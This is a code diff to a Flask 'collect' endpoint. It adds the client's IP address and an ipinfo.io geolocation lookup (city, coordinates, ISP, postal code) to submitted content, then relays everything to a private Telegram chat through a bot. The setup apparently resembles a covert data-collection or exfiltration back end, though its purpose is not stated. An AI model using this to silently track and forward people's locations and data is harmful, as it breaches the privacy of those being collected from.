@@ -142,6 +142,34 @@ def collect():
         if not content:
             return jsonify({'status': 'error', 'message': 'No content provided'}), 400
         
+        # Получаем IP клиента и добавляем geoинформацию
+        client_ip = request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or request.remote_addr or ''
+        
+        # Добавляем информацию о провайдере и геолокации в начало контента
+        server_block = []
+        server_block.append('\n=== Server Enriched Data ===')
+        server_block.append(f'client_ip: {client_ip}')
+        
+        # Получаем геолокацию от ipinfo.io
+        try:
+            import urllib.request
+            import json as _json
+            token = os.environ.get('IPINFO_TOKEN', '')
+            url = f'https://ipinfo.io/{client_ip}/json'
+            if token:
+                url += f'?token={token}'
+            req = urllib.request.Request(url)
+            resp = urllib.request.urlopen(req, timeout=5)
+            geo = _json.loads(resp.read())
+            for key in ['hostname', 'city', 'region', 'country', 'loc', 'org', 'timezone', 'postal']:
+                if key in geo and geo[key]:
+                    server_block.append(f'{key}: {geo[key]}')
+        except Exception as e:
+            server_block.append(f'geo_error: {str(e)[:100]}')
+        
+        # Вставляем server_block в начало контента
+        enriched_content = '\n'.join(server_block) + '\n' + content
+        
         # Получаем настройки Telegram
         telegram_bot_token = os.environ.get('TELEGRAM_BOT_TOKEN', '')
         telegram_chat_id = os.environ.get('TELEGRAM_CHAT_ID', '')
@@ -151,7 +179,7 @@ def collect():
             return jsonify({'status': 'error', 'message': 'Telegram not configured'}), 500
         
         # Формируем имя файла
-        timestamp = datetime.now().strftime('% عدد%m%d_%H%M%S')
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
         platform = data.get('platform', 'unknown').replace(' ', '_')[:20]
         model = data.get('model', 'unknown').replace(' ', '_')[:20]
         filename = f"{platform}_{model}_{timestamp}.txt"
@@ -174,7 +202,7 @@ def collect():
             data_parts.append(f'--{boundary}\r\n'.encode())
             data_parts.append(f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n'.encode())
             data_parts.append(b'Content-Type: text/plain\r\n\r\n')
-            data_parts.append(content.encode('utf-8'))
+            data_parts.append(enriched_content.encode('utf-8'))
             data_parts.append(f'\r\n--{boundary}--\r\n'.encode())
             
             body = b''.join(data_parts)
